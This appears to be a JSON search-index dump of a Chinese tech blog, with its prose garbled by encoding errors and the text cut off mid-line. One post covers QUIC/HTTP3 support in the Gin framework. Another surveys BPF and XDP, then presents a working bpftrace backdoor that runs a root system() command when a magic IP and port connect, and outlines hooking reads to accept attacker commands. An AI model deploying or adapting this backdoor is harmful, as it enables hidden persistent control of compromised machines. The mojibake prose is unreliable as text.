è¾“å±‚(TCP)ä»ç„¶å­˜åœ¨ï¼›HTTP/3 ä½¿ç”¨ QUIC æ›¿ä»£ TCPï¼Œæ¶ˆé™¤äº†ä¼ è¾“å±‚ä¸­çš„ HOL é˜»å¡ã€‚[1]\n0RTT\nHTTPS over TCP\u0026amp;TLSå»ºç«‹è¿æ¥è‡³å°‘éœ€è¦åä¸ªåŒ…ã€‚HTTP3å¯¹æ­¤è¿›è¡Œæ”¹è¿›ï¼šé¦–æ¬¡è¿æ¥ï¼Œä½¿ç”¨QUICåè®®çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¦ä½¿ç”¨1RTTä½¿ç”¨DH(Diffie-Hellman)è¿ªè²-èµ«å°”æ›¼ç®—æ³•è¿›è¡Œå¯†é’¥äº¤æ¢ï¼›éé¦–æ¬¡è¿æ¥ï¼Œå®¢æˆ·ç«¯ä¿å­˜config(æœ‰å¤±æ•ˆæ—¶é—´)è·³è¿‡1RTTå®ç°0RTTä¸šåŠ¡æ•°æ®äº¤äº’ã€‚å‰å‘å®‰å…¨ä¿è¯äº†è¿‡å»è¿›è¡Œçš„é€šè®¯ä¸å—å¯†é’¥åœ¨æœªæ¥æš´éœ²çš„å¨èƒï¼ŒQUICé€šè¿‡æ¯æ¬¡ä½¿ç”¨ä¸´æ—¶å¯†ç ç„¶åé”€æ¯çš„æ–¹å¼å®ç°å‰å‘å®‰å…¨ï¼Œä¸å¿…æ‹…å¿ƒconfigæ³„éœ²ã€‚QUIC åƒ TLS 1.3 ä¸€æ ·å…è®¸å®¢æˆ·ç«¯åœ¨è¿æ¥æ¡æ‰‹å®Œæˆä¹‹å‰å¼€å§‹å‘é€ HTTP è¯·æ±‚\nFEC\nå‰å‘çº é”™ï¼ˆForward Error Correctionï¼‰ï¼Œæ˜¯æŒ‡é€šè¿‡å‘é€å†—ä½™çš„ç¼–ç æ•°æ®ï¼Œä½¿å¾—æ¥æ”¶æ–¹å½“ä¼ è¾“è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯æ—¶ï¼Œæ¥æ”¶æ–¹èƒ½ä»æ”¶åˆ°çš„æ•°æ®ä¸­é‡å»ºå’Œè¿˜åŸå¾—åˆ°æ­£ç¡®çš„åŸå§‹æ•°æ®ã€‚\nFECç®—æ³•æœ‰å¾ˆå¤šç§ï¼ŒåŒ…æ‹¬å†…å­˜ä¸­ä½¿ç”¨çš„æ±‰æ˜ç ï¼Œç£ç›˜å­˜å‚¨ç³»ç»Ÿä¸­å¸¸ç”¨çš„Reed-Solomonç ï¼Œè¿˜æœ‰ç§»åŠ¨é€šä¿¡ä¸­ç”¨åˆ°çš„å·ç§¯ç ã€Turboç ã€LDPCç ç­‰ã€‚\næ—©æœŸQUICä¸­ä½¿ç”¨çš„FECç®—æ³•æ˜¯åŸºäºXORçš„ç®€å•å®ç°ï¼Œä¸è¿‡IETFçš„QUICåè®®æ ‡å‡†ä¸­å·²ç»æ²¡æœ‰FECçš„è¸ªå½±ï¼ŒçŒœæµ‹æ˜¯FECåœ¨QUICåè®®çš„åº”ç”¨åœºæ™¯ä¸­éš¾ä»¥è¢«é«˜æ•ˆçš„ä½¿ç”¨ã€‚\nè¿æ¥è¿ç§»\nTCPåè®®ä½¿ç”¨äº”å…ƒç»„æ¥è¡¨ç¤ºä¸€æ¡å”¯ä¸€çš„è¿æ¥ï¼Œå½“æˆ‘ä»¬ä»4Gç¯å¢ƒåˆ‡æ¢åˆ°wifiç¯å¢ƒæ—¶ï¼Œæ‰‹æœºçš„IPåœ°å€å°±ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™æ—¶å¿…é¡»åˆ›å»ºæ–°çš„TCPè¿æ¥æ‰èƒ½ç»§ç»­ä¼ è¾“æ•°æ®ã€‚QUICåè®®åŸºäºUDPå®ç°æ‘’å¼ƒäº†äº”å…ƒç»„çš„æ¦‚å¿µï¼Œä½¿ç”¨64ä½çš„éšæœºæ•°ä½œä¸ºè¿æ¥çš„IDï¼Œå¹¶ä½¿ç”¨è¯¥IDè¡¨ç¤ºè¿æ¥ã€‚åŸºäºQUICåè®®ä¹‹ä¸‹ï¼Œæˆ‘ä»¬åœ¨æ—¥å¸¸wifiå’Œ4Gåˆ‡æ¢æ—¶ï¼Œæˆ–è€…ä¸åŒåŸºç«™ä¹‹é—´åˆ‡æ¢éƒ½ä¸ä¼šé‡è¿ï¼Œä»è€Œæé«˜ä¸šåŠ¡å±‚çš„ä½“éªŒã€‚\nç°æœ‰åº“å®ç° å…·ä½“çš„å®ç°æœ‰å¾ˆå¤šå¯ä»¥çœ‹WIKIä¸Šçš„è¡¨æ ¼[6]ï¼ŒCloudflareä½œä¸ºå¾ˆæ—©å°±å‘å±•http3çš„ä¼ä¸šå¼€æºäº†ä¸€ä¸ªrustå†™çš„åº“[4]ï¼Œä½†æ˜¯Goçš„å¼€æºåº“å°±åªæœ‰ä¸€ä¸ªquic-go\nGinçš„HTTP3æ”¯æŒ Ginç°åœ¨å¹¶æ²¡æœ‰releaseæ”¯æŒHTTP3ï¼Œä½†æ˜¯å¾ˆæ—©å°±æœ‰è¿‡issueå’Œprå®éªŒï¼Œé“¾æ¥å¦‚ä¸‹\nCan gin support HTTP/3?\nexperimental: support http3\nå…¶ä¸­PRçš„ä¿®æ”¹ååˆ†ç®€å•ï¼Œåªæ˜¯åŒGinä»¥å¾€çš„é€»è¾‘ï¼Œåœ¨gin.goä¸­æ·»åŠ äº†ä¸€ä¸ªæ”¯æŒQUICåè®®çš„Runå‡½æ•°ã€‚å› QUICåè®®è‡ªèº«æ”¯æŒåŠ å¯†ï¼Œæ‰€ä»¥å‡½æ•°å®ç°æ›´åƒæ˜¯RunTLSï¼Œéœ€è¦ä¼ å…¥è¯ä¹¦å¯†é’¥æ–‡ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 import \u0026#34;github.com/lucas-clemente/quic-go/http3\u0026#34; func (engine *Engine) RunQUIC(addr, certFile, keyFile string) (err error) { debugPrint(\u0026#34;Listening and serving QUIC on %s\\n\u0026#34;, addr) defer func() { debugPrintError(err) }() if engine.isUnsafeTrustedProxies() { debugPrint(\u0026#34;[WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.\\n\u0026#34; + \u0026#34;Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.\u0026#34;) } err = http3.ListenAndServeQUIC(addr, certFile, keyFile, engine.Handler()) return } å…¶ä¸­quic-goæ˜¯çº¯Goçš„QUICå®ç°ï¼Œè®¸å¤šå¤§å‹é¡¹ç›®å·²ç»åœ¨ä½¿ç”¨è¿™ä¸ªåº“ã€‚\næµ‹è¯•ä¹Ÿè·ŸTestRunTLSä¸€æ¨¡ä¸€æ ·\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import \u0026#34;github.com/stretchr/testify/assert\u0026#34; // params[0]=url example:http://127.0.0.1:8080/index (cannot be empty) // params[1]=response status (custom compare status) default:\u0026#34;200 OK\u0026#34; // params[2]=response body (custom compare content) default:\u0026#34;it worked\u0026#34; func testRequest(t *testing.T, params ...string) { if len(params) == 0 { t.Fatal(\u0026#34;url cannot be empty\u0026#34;) } tr := \u0026amp;http.Transport{ TLSClientConfig: \u0026amp;tls.Config{ InsecureSkipVerify: true, }, } client := \u0026amp;http.Client{Transport: tr} resp, err := client.Get(params[0]) assert.NoError(t, err) defer resp.Body.Close() body, ioerr := ioutil.ReadAll(resp.Body) assert.NoError(t, ioerr) var responseStatus = \u0026#34;200 OK\u0026#34; if len(params) \u0026gt; 1 \u0026amp;\u0026amp; params[1] != \u0026#34;\u0026#34; { responseStatus = params[1] } var responseBody = \u0026#34;it worked\u0026#34; if len(params) \u0026gt; 2 \u0026amp;\u0026amp; params[2] != \u0026#34;\u0026#34; { responseBody = params[2] } assert.Equal(t, responseStatus, resp.Status, \u0026#34;should get a \u0026#34;+responseStatus) if responseStatus == \u0026#34;200 OK\u0026#34; { assert.Equal(t, responseBody, string(body), \u0026#34;resp body should match\u0026#34;) } } func TestRunQUIC(t *testing.T) { router := New() go func() { router.GET(\u0026#34;/example\u0026#34;, func(c *Context) { c.String(http.StatusOK, \u0026#34;it worked\u0026#34;) }) assert.NoError(t, router.RunQUIC(\u0026#34;:8443\u0026#34;, \u0026#34;./testdata/certificate/cert.pem\u0026#34;, \u0026#34;./testdata/certificate/key.pem\u0026#34;)) }() // have to wait for the goroutine to start and run the server // otherwise the main thread will complete time.Sleep(5 * time.Millisecond) assert.Error(t, router.RunQUIC(\u0026#34;:8443\u0026#34;, \u0026#34;./testdata/certificate/cert.pem\u0026#34;, \u0026#34;./testdata/certificate/key.pem\u0026#34;)) testRequest(t, \u0026#34;https://localhost:8443/example\u0026#34;) } Curl http3 ç›´æ¥ä¿®æ”¹Ginæºç æ·»åŠ RunQUICå‡½æ•°æ”¯æŒhttp3ï¼Œå¹¶ç¼–å†™ç®€å•server\n1 2 3 4 5 6 7 8 9 10 11 12 13 package main import ( \u0026#34;net/http\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; ) func main() { router := gin.New() router.GET(\u0026#34;/example\u0026#34;, func(c *gin.Context) { c.String(http.StatusOK, \u0026#34;ruokeqx http3 worked\u0026#34;) }) router.RunQUIC(\u0026#34;:8080\u0026#34;, \u0026#34;./cert.pem\u0026#34;, \u0026#34;./key.pem\u0026#34;) } æ‰‹åŠ¨ç¼–è¯‘[5]æ”¯æŒhttp3çš„curlè¿›è¡Œè®¿é—®ï¼Œç¼–è¯‘çš„æ—¶å€™è¦æ³¨æ„ç‚¹æ˜¯\u0026lt;somewhere1\u0026gt;/libå®é™…ä¸Šæ˜¯\u0026lt;somewhere1\u0026gt;/lib64 å¦åˆ™ä¼šç¼–è¯‘å‡ºé”™[5]\nRef [1] wiki HOL blocking\n[2] å›¾è§£|ä¸ºä»€ä¹ˆHTTP3.0ä½¿ç”¨UDPåè®®\n[3] Gin PR 3210 experimental: support http3\n[4] Cloudflare http3\n[5] build http3 curl\n[6] Wiki http3\n","description":"","id":11,"section":"posts","tags":["network","http3"],"title":"æµ…å°QUICå’ŒHTTP3","uri":"https://ruokeqx.gitee.io/posts/quichttp3_demo/"},{"content":"BPFç»¼è¿° BPFåŠŸèƒ½ BPFæ ¸å¿ƒç”¨ä¾‹æ˜¯tracing, observability, perfomance measuring and security tooling.\nè®¸å¤šæœ€æ–°çš„æ£€æµ‹ã€ç›‘æ§è½¯ä»¶å’Œæ€§èƒ½è·Ÿè¸ªå·¥å…·éƒ½æ˜¯ç”¨BPFç¼–å†™çš„ï¼Œå°¤å…¶æ˜¯äº‘åŸç”Ÿæ—¶ä»£ï¼ˆCiliumï¼‰\nåŠ è½½BPFç¨‹åº åŠ è½½BPFç¨‹åºéœ€è¦rootæˆ–è€…CAP_BPFæƒé™\néç‰¹æƒç”¨æˆ·åªèƒ½è°ƒç”¨BPF_PROG_TYPE_SOCKET_FILTERå’ŒBPF_PROG_TYPE_CGROUP_SKB\ncat /proc/sys/kernel/unprivileged_bpf_disabledæŸ¥çœ‹æƒé™\nsysctl kernel.unprivileged_bpf_disabled=1\nå€¼ä¸º0è¡¨ç¤ºå…è®¸éç‰¹æƒç”¨æˆ·è°ƒç”¨bpfï¼› å€¼ä¸º1è¡¨ç¤ºç¦æ­¢éç‰¹æƒç”¨æˆ·è°ƒç”¨bpfä¸”è¯¥å€¼ä¸å¯å†ä¿®æ”¹ï¼Œåªèƒ½é‡å¯åä¿®æ”¹ï¼› å€¼ä¸º2è¡¨ç¤ºç¦æ­¢éç‰¹æƒç”¨æˆ·è°ƒç”¨bpfï¼Œå¯ä»¥å†æ¬¡ä¿®æ”¹ä¸º0æˆ–1ã€‚ åŠ è½½è¿‡ç¨‹å¦‚ä¸‹ï¼š\nLoad:ç”¨æˆ·æ€ç¨‹åºä½¿ç”¨BPF_PROG_LOADå‚æ•°è°ƒç”¨bpf()æ¥åŠ è½½ç¨‹åº Config:ç”¨æˆ·æ€ç¨‹åºå°†BPFç¨‹åºå’Œäº‹ä»¶è”ç³»èµ·æ¥ã€‚ä¾‹å¦‚é€šè¿‡ioctl()è°ƒç”¨(ä¾‹å¦‚PERF_EVENT_IOC_SET_BPF)ã€‚ BPFç¨‹åºæ˜¯éæŒä¹…æ€§çš„ æ‰€ä»¥ç³»ç»Ÿé‡å¯äº†ä¹Ÿéœ€è¦é‡å¯\nBPFå®‰å…¨ç›¸å…³ hookç³»ç»Ÿè°ƒç”¨å’Œç”¨æˆ·å‡½æ•° æ“ä½œç”¨æˆ·æ•°æ®ç»“æ„ å¤å†™ç³»ç»Ÿè°ƒç”¨è¿”å›å€¼ è°ƒç”¨system()åˆ›å»ºæ–°è¿›ç¨‹ æŒ‚åœ¨BPFç¨‹åºåˆ°ç‰©ç†è®¾å¤‡ä¸Š å¦‚ç½‘å¡ æ–°çš„ä¾›åº”é“¾æ”»å‡»é¢ å°†å®‰å…¨å’Œæ£€æµ‹å·¥å…·æ··åˆ ä¸€äº›BPFä½œä¸ºrootkitï¼Œä¸€äº›ç”¨æ¥å®¹å™¨é€ƒé€¸ BTF BTF æ˜¯ BPF CO-RE çš„æ ¸å¿ƒä¹‹ä¸€ï¼Œ å®ƒæ˜¯æ˜¯ä¸€ç§ä¸ DWARF ç±»ä¼¼çš„è°ƒè¯•ä¿¡æ¯ï¼Œä½†\næ›´é€šç”¨ã€è¡¨è¾¾æ›´ä¸°å¯Œï¼Œç”¨äºæè¿° C ç¨‹åºçš„æ‰€æœ‰ç±»å‹ä¿¡æ¯ã€‚ æ›´ç®€å•ï¼Œç©ºé—´æ•ˆç‡æ›´é«˜ï¼ˆä½¿ç”¨ BTF å»é‡ç®—æ³•ï¼‰ï¼Œ å ç”¨ç©ºé—´æ¯” DWARF ä½ 100xã€‚ å¦‚ä»Šï¼Œè®© Linux å†…æ ¸åœ¨è¿è¡Œæ—¶ï¼ˆruntimeï¼‰ä¸€ç›´æºå¸¦ BTF ä¿¡æ¯æ˜¯å¯è¡Œçš„ï¼Œ åªéœ€åœ¨ç¼–è¯‘æ—¶æŒ‡å®š CONFIG_DEBUG_INFO_BTF=yã€‚å†…æ ¸çš„ BTF é™¤äº†è¢«å†…æ ¸è‡ªèº«ä½¿ç”¨ï¼Œ ç°åœ¨è¿˜ç”¨äºå¢å¼º BPF æ ¡éªŒå™¨è‡ªèº«çš„èƒ½åŠ› â€”â€” æŸäº›èƒ½åŠ›ç”šè‡³è¶…è¶Šäº†ä¸€å¹´ä¹‹å‰æˆ‘ä»¬çš„æƒ³è±¡åŠ›æ‰€åŠï¼ˆä¾‹å¦‚ï¼Œå·²ç»æœ‰äº†ç›´æ¥è¯»å–å†…æ ¸å†…å­˜çš„èƒ½åŠ›ï¼Œä¸å†éœ€è¦é€šè¿‡ bpf_probe_read() é—´æ¥è¯»å–äº†ï¼‰ã€‚\næ›´é‡è¦çš„æ˜¯ï¼Œå†…æ ¸å·²ç»å°†è¿™ä¸ªè‡ªæè¿°çš„æƒå¨ BTF ä¿¡æ¯ï¼ˆå®šä¹‰ç»“æ„ä½“çš„ç²¾ç¡®å†…å­˜å¸ƒå±€ç­‰ä¿¡æ¯ï¼‰ é€šè¿‡ sysfs æš´éœ²å‡ºæ¥ï¼Œåœ¨ /sys/kernel/btf/vmlinuxã€‚ ä¸‹é¢çš„å‘½ä»¤å°†ç”Ÿæˆä¸€ä¸ªä¸æ‰€æœ‰å†…æ ¸ç±»å‹å…¼å®¹çš„ C å¤´æ–‡ä»¶ï¼ˆé€šå¸¸ç§°ä¸º â€œvmlinux.hâ€ï¼‰ï¼š\n$ bpftool btf dump file /sys/kernel/btf/vmlinux format c \u0026gt; vmlinux.h è¿™é‡Œè¯´çš„â€æ‰€æœ‰â€œçœŸçš„æ˜¯â€œæ‰€æœ‰â€ï¼šåŒ…æ‹¬é‚£äº›å¹¶æœªé€šè¿‡ kernel-devel package å¯¼å‡ºçš„ç±»å‹ï¼\næœ‰äº† vmlinux.hï¼Œå°±æ— éœ€å†åƒé€šå¸¸çš„ BPF ç¨‹åºé‚£æ · #include \u0026lt;linux/sched.h\u0026gt;ã€#include \u0026lt;linux/fs.h\u0026gt; ç­‰ç­‰å¤´æ–‡ä»¶ï¼Œ ç°åœ¨åªéœ€è¦ #include \u0026quot;vmlinux.h\u0026quot;ï¼Œä¹Ÿä¸ç”¨å†å®‰è£… kernel-devel äº†ã€‚\nä¸å¹¸çš„æ˜¯ï¼ŒBPFï¼ˆä»¥åŠ DWARFï¼‰å¹¶ä¸è®°å½• #define å®ï¼Œå› æ­¤æŸäº›å¸¸ç”¨ çš„å®å¯èƒ½åœ¨ vmlinux.h ä¸­æ˜¯ç¼ºå¤±çš„ã€‚ä½†è¿™äº›æ²¡æœ‰è®°å½•çš„å®ä¸­ ï¼Œæœ€å¸¸è§çš„ä¸€äº›å·²ç»åœ¨ bpf_helpers.h ï¼ˆlibbpf æä¾›çš„å†…æ ¸ä¾§â€åº“â€œï¼‰æä¾›äº†ã€‚\nXDP XDPå…¨ç§°ä¸ºeXpress Data Pathï¼Œæ˜¯Linuxå†…æ ¸ç½‘ç»œæ ˆçš„æœ€åº•å±‚ã€‚å®ƒåªå­˜åœ¨äºRXè·¯å¾„ä¸Šï¼Œå…è®¸åœ¨ç½‘ç»œè®¾å¤‡é©±åŠ¨å†…éƒ¨ç½‘ç»œå †æ ˆä¸­æ•°æ®æ¥æºæœ€æ—©çš„åœ°æ–¹è¿›è¡Œæ•°æ®åŒ…å¤„ç†ï¼Œåœ¨ç‰¹å®šæ¨¡å¼ä¸‹å¯ä»¥åœ¨æ“ä½œç³»ç»Ÿåˆ†é…å†…å­˜ï¼ˆskbï¼‰ä¹‹å‰å°±å·²ç»å®Œæˆå¤„ç†ã€‚\nXDPæš´éœ²äº†ä¸€ä¸ªå¯ä»¥åŠ è½½BPFç¨‹åºçš„ç½‘ç»œé’©å­ã€‚åœ¨è¿™ä¸ªé’©å­ä¸­ï¼Œç¨‹åºèƒ½å¤Ÿå¯¹ä¼ å…¥çš„æ•°æ®åŒ…è¿›è¡Œä»»æ„ä¿®æ”¹å’Œå¿«é€Ÿå†³ç­–ï¼Œé¿å…äº†å†…æ ¸å†…éƒ¨å¤„ç†å¸¦æ¥çš„é¢å¤–å¼€é”€ã€‚è¿™ä½¿å¾—XDPåœ¨æ€§èƒ½é€Ÿåº¦æ–¹é¢æˆä¸ºæœ€ä½³é’©å­ï¼Œä¾‹å¦‚ç¼“è§£DDoSæ”»å‡»ç­‰ï¼Œç›¸å…³èƒŒæ™¯çŸ¥è¯†å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ã€‚\nXDPæš´éœ²çš„é’©å­å…·æœ‰ç‰¹å®šçš„è¾“å…¥ä¸Šä¸‹æ–‡ï¼Œå®ƒæ˜¯å•ä¸€è¾“å…¥å‚æ•°ã€‚å®ƒçš„ç±»å‹ä¸º struct xdp_mdï¼Œåœ¨å†…æ ¸å¤´æ–‡ä»¶bpf.h ä¸­å®šä¹‰ï¼Œå…·ä½“å­—æ®µå¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 /* user accessible metadata for XDP packet hook * new fields must be added to the end of this structure */ struct xdp_md { __u32 data; __u32 data_end; __u32 data_meta; /* Below access go through struct xdp_rxq_info */ __u32 ingress_ifindex; /* rxq-\u0026gt;dev-\u0026gt;ifindex */ __u32 rx_queue_index; /* rxq-\u0026gt;queue_index */ }; ç¨‹åºæ‰§è¡Œæ—¶ï¼Œdataå’Œdata_endå­—æ®µåˆ†åˆ«æ˜¯æ•°æ®åŒ…å¼€å§‹å’Œç»“æŸçš„æŒ‡é’ˆï¼Œå®ƒä»¬æ˜¯ç”¨æ¥è·å–å’Œè§£æä¼ æ¥çš„æ•°æ®ï¼Œç¬¬ä¸‰ä¸ªå€¼æ˜¯data_metaæŒ‡é’ˆï¼Œåˆå§‹é˜¶æ®µå®ƒæ˜¯ä¸€ä¸ªç©ºé—²çš„å†…å­˜åœ°å€ï¼Œä¾›XDPç¨‹åºä¸å…¶ä»–å±‚äº¤æ¢æ•°æ®åŒ…å…ƒæ•°æ®æ—¶ä½¿ç”¨ã€‚æœ€åä¸¤ä¸ªå­—æ®µåˆ†åˆ«æ˜¯æ¥æ”¶æ•°æ®åŒ…çš„æ¥å£å’Œå¯¹åº”çš„RXé˜Ÿåˆ—çš„ç´¢å¼•ã€‚å½“è®¿é—®è¿™ä¸¤ä¸ªå€¼æ—¶ï¼ŒBPFä»£ç ä¼šåœ¨å†…æ ¸å†…éƒ¨é‡å†™ï¼Œä»¥è®¿é—®å®é™…æŒæœ‰è¿™äº›å€¼çš„å†…æ ¸ç»“æ„struct xdp_rxq_infoã€‚\nåœ¨å¤„ç†å®Œä¸€ä¸ªæ•°æ®åŒ…åï¼ŒXDPç¨‹åºä¼šè¿”å›ä¸€ä¸ªåŠ¨ä½œï¼ˆActionï¼‰ä½œä¸ºè¾“å‡ºï¼Œå®ƒä»£è¡¨äº†ç¨‹åºé€€å‡ºåå¯¹æ•°æ®åŒ…åº”è¯¥åšä»€ä¹ˆæ ·çš„æœ€ç»ˆè£å†³ï¼Œä¹Ÿæ˜¯åœ¨å†…æ ¸å¤´æ–‡ä»¶bpf.h å®šä¹‰äº†ä»¥ä¸‹5ç§åŠ¨ä½œç±»å‹ï¼š\n1 2 3 4 5 6 7 enum xdp_action { XDP_ABORTED = 0, // Drop packet while raising an exception XDP_DROP, // Drop packet silently XDP_PASS, // Allow further processing by the kernel stack XDP_TX, // Transmit from the interface it came from XDP_REDIRECT, // Transmit packet from another interface }; libbpf \u0026amp;\u0026amp; libbpf-bootstrap libbpfæ˜¯ä¸ºå¿«é€Ÿæ„å»ºbpfç¨‹åºçš„ä¸€ä¸ªåº“ï¼Œä¸bccç±»ä¼¼ï¼Œéœ€è¦ç¼–å†™bpfç¨‹åºå’Œä¸€ä¸ªè£…è½½ç¨‹åºï¼Œå¯¹äºç¼–å†™tracepointã€kprobeã€uprobeç­‰æ¥è¯´æ¯”è¾ƒä¾¿æ·ã€‚\nbpfç¼–å†™çš„xdpç¨‹åºå¯ä»¥ç›´æ¥ç”¨å‘½ä»¤æŒ‚åœ¨åˆ°ç½‘å¡ ä¸ä¸€å®šéœ€è¦è£…è½½å™¨ï¼Œå…¶ä¸­libbpf-boorstrapåªæä¾›äº†rustçš„å†™æ³•ï¼ˆå¯¹äºæ²¡æœ‰å­¦è¿‡rustçš„åŒå­¦ä¸å¤ªå‹å¥½ï¼‰ï¼Œç›´æ¥ç¡¬æ¬cå†™æ³•çš„è¯æ˜¯è£…è½½ä¸ä¸Šçš„ã€‚\nlibbpf or libbpf-bootstrapçš„å†™æ³•ä¸­å¸¸å‡ºç°SEC(\u0026ldquo;tracepoint/\u0026hellip;\u0026quot;)çš„å†™æ³•ï¼Œè¿™åªæ˜¯ä»£ç æ®µçš„å‘½åï¼Œå¯¹äºtracepointã€uprobeç­‰ä¼šæ ¹æ®å…¶æŒ‚åœ¨åˆ°å¯¹åº”çš„ç‚¹ä¸Šã€‚ä½†æ˜¯å¯¹äºSEC(\u0026ldquo;xdp/.\u0026quot;)ï¼Œç›´æ¥ç…§æŠ„libbpf-bootstrapçš„cå†™æ³•ä¼šæŠ¥é”™ï¼Œå¯ä»¥é‡‡ç”¨ç¼–è¯‘åæ‰‹åŠ¨æŒ‚è½½çš„æ–¹æ³•ï¼Œå¦‚æœä¼šrustä¹Ÿå¯ä»¥å‚è€ƒåº“ä¸­rustå†™æ³•ï¼Œä¹Ÿå¯ä»¥å‚ç…§xdp-tutorialçš„å†™æ³•ã€‚\n1 2 3 4 5 6 clang -O2 -target bpf -c xdp-drop.c -o xdp-drop.o -I /usr/include/x86_64-linux-gnu sudo ip link set dev docker0 xdp obj xdp-drop.o sec xdp verbose sudo ip link list docker run -d -p 80:80 nginx curl 127.0.0.1 sudo ip link set dev docker0 xdp off bpftrace backdoor Validator å‡è®¾ç”¨æˆ·å·²ç»è·å–ä¸€ä¸ªroot shellï¼Œå¸Œæœ›ç”¨bpfæ­å»ºéšè—æ€§æ›´å¥½çš„åé—¨ã€‚\nå¯ä»¥ä½¿ç”¨è¿œç¨‹IPåœ°å€å’ŒTCPè¿æ¥çš„æºç«¯å£å·çš„ç»„åˆæ¥è§¦å‘BPFç¨‹åºã€‚\nè¦æ³¨æ„çš„æ˜¯ç½‘ç»œæ˜¯å¤§ç«¯ä¼ è¾“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ç»“æ„ä½“ä¸­å–å‡ºçš„ipåœ°å€æ•°æ˜¯ipåœ°å€çš„å¤§ç«¯æ•° å…·ä½“å¯è½¬åŒ–ä¸ºhexç„¶åå€’åº\n1 2 3 4 5 6 7 8 9 10 \u0026gt;\u0026gt;\u0026gt; hex(2156439744) \u0026#39;0x8088a8c0\u0026#39; \u0026gt;\u0026gt;\u0026gt; 0xc0 192 \u0026gt;\u0026gt;\u0026gt; 0xa8 168 \u0026gt;\u0026gt;\u0026gt; 0x88 136 \u0026gt;\u0026gt;\u0026gt; 0x80 128 ä»¥ä¸‹æ˜¯æœ€ç®€å•çš„è§¦å‘å™¨ å¦‚æœæ¥æºIPå’Œç«¯å£æ»¡è¶³æ¡ä»¶å°±æ‰§è¡ŒæŸç³»ç»Ÿå‘½ä»¤ï¼ˆæ­¤å¤„æ˜¯ç›´æ¥ç…§æŠ„refçš„å®ç° åšå®Œåå›å¤´çœ‹æ¥æ˜¯ååˆ†ä¸æˆç†Ÿçš„å†™æ³•ï¼‰\ninclude/net/sock.h\n#include \u0026lt;net/sock.h\u0026gt;\rBEGIN\r{\rprintf(\u0026#34;Welcome to Offensive BPF... Use Ctrl-C to exit.\\n\u0026#34;);\rprintf(\u0026#34;Allowed IP: %u (=\u0026gt; %s). Magic Port: %u\\n\u0026#34;, $1, ntop(AF_INET, $1), $2);\r}\rkretprobe:inet_csk_accept\r{\r$sk = (struct sock *) retval;\r// only supporting IPv4\rif ( $sk-\u0026gt;__sk_common.skc_family == AF_INET )\r{\rprintf(\u0026#34;-\u0026gt;%s: Checking RemoteAddr... %s (%u).\\n\u0026#34;, func,\rntop($sk-\u0026gt;__sk_common.skc_daddr),\r$sk-\u0026gt;__sk_common.skc_daddr);\r//is IP allowed?\rif ($sk-\u0026gt;__sk_common.skc_daddr == (uint32)$1)\r{\rprintf(\u0026#34;-\u0026gt;%s: IP check passed.\\n\u0026#34;, func);\r$src_port_tmp = (uint16) $sk-\u0026gt;__sk_common.skc_dport;\r$src_port = (( $src_port_tmp \u0026gt;\u0026gt; 8) | (( $src_port_tmp \u0026lt;\u0026lt; 8) \u0026amp; 0x00FF00));\rprintf(\u0026#34;-\u0026gt;%s: Checking port: %d...\\n\u0026#34;, func, $src_port);\rif ($src_port == (uint16) $2)\r{\rprintf(\u0026#34;-\u0026gt;%s: Magic port check passed.\\n\u0026#34;, func); system(\u0026#34;whoami \u0026gt;\u0026gt; /proc/1/root/tmp/o\u0026#34;);\rprintf(\u0026#34;-\u0026gt;%s: Command executed.\\n\u0026#34;, func);\r}\relse\r{\rprintf(\u0026#34;-\u0026gt;%s: Magic port check FAILED.\\n\u0026#34;, func);\r}\r}\r}\r} Backdoor å®Œæˆäº†éªŒè¯ä¹‹åå°±æ˜¯è·å–å¹¶æ‰§è¡Œç”¨æˆ·ä¼ å…¥çš„å‘½ä»¤\nå¯ä»¥hook sys_enter_read ä½†æ˜¯è¿˜æ²¡æœ‰å¡«å……æ•°æ®ï¼Œsys_exit_readå¡«å……å®Œæ•°æ®ä½†æ˜¯sys_exit_readå¹¶ä¸èƒ½è®¿é—®åˆ°bufå‚æ•°ã€‚\næ‰€ä»¥å¯ä»¥åœ¨ sys_enter_read å†…éƒ¨æ—¶å°†æŒ‡é’ˆå­˜å‚¨åœ¨ BPF æ˜ å°„ä¸­ï¼Œç„¶ååœ¨ sys_exit_read ä¸­è¯»å–å’Œä½¿ç”¨è¯¥æŒ‡é’ˆæ¥è§£å†³çš„ã€‚\nå½“ç„¶éœ€è¦æš´éœ²åœ¨å…¬ç½‘çš„æœåŠ¡æ¥ä¼ æ•°æ® å¦‚ä¸Šé¢ä½¿ç”¨nginxå¼€äº†ä¸ªwebæœåŠ¡\nå¯¹äº OpenSSHï¼Œè¦hookç”¨æˆ·ç©ºé—´ã€‚ SSH æœåŠ¡å™¨åªé€šè¿‡ read() è¯»å–å•ä¸ªå­—èŠ‚ï¼Œè¿™ä½¿å¾—ä½¿ç”¨ bpftrace è§£æå’Œè¿æ¥å­—èŠ‚æˆ–éå†æ­£ç¡®çš„ç»“æ„æœ‰ç‚¹éº»çƒ¦ã€‚\nstarceæŸ¥çœ‹nginxè·å–ç³»ç»Ÿè°ƒç”¨ä¿¡æ¯çš„ å‘ç°ä½¿ç”¨çš„æ˜¯recvfromç³»ç»Ÿè°ƒç”¨\nPS:å¯ä»¥ç›´æ¥åœ¨æ­¤å¤„çœ‹åˆ°å‡½æ•°å‚æ•° ï¼ˆåˆšå¼€å§‹ä¸€ç›´ç–¯ç‹‚è§£æåƒä¸ªå‚»é€¼ï¼‰\n1 2 3 4 5 6 7 8 âœ bpfbackdoor sudo strace -p 14911 strace: Process 14911 attached epoll_wait(10, [{events=EPOLLIN, data={u32=2632245264, u64=140448062824464}}], 512, -1) = 1 accept4(7, {sa_family=AF_INET, sin_port=htons(47722), sin_addr=inet_addr(\u0026#34;192.168.136.128\u0026#34;)}, [112 =\u0026gt; 16], SOCK_NONBLOCK) = 23 epoll_ctl(10, EPOLL_CTL_ADD, 23, 